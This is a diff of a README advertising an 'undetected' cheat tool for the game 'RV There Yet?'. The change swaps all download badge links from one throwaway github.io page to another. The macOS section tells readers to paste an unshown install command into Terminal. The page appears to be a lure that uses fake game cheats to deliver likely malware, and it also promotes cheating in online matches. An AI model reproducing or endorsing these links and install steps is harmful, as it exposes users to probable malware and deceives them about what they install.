@@ -1,9 +1,9 @@
 # 🎮 RV There Yet? Tool — Evidence V2
 
-[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://WatchMizukageSnap.github.io/getwindows/)
-[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://WatchMizukageSnap.github.io/getmac/)
-[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://WatchMizukageSnap.github.io/getwindows/)
-[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://WaterCongressman.github.io/win-download/)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://WaterCongressman.github.io/mac-download/)
+[![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://WaterCongressman.github.io/win-download/)
+[![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://WaterCongressman.github.io/win-download/)
 
 > The most trusted **RV There Yet? Tool** for 2026 — operates as a standalone utility with no game process injection, providing a safe and undetected experience.
 
@@ -45,14 +45,14 @@
 5. 🎮 Launch **RV There Yet?** and enter a match
 6. 📋 Press **INSERT** to open the overlay menu
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://WatchMizukageSnap.github.io/getwindows/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://WaterCongressman.github.io/win-download/)
 
 ### macOS
 1. Press ⌘ + Space, open **Terminal**
 2. Paste the install command and press Enter
 3. Follow the on-screen prompts
 
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WatchMizukageSnap.github.io/getmac/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WaterCongressman.github.io/mac-download/)
 
 **Menu Controls**
 
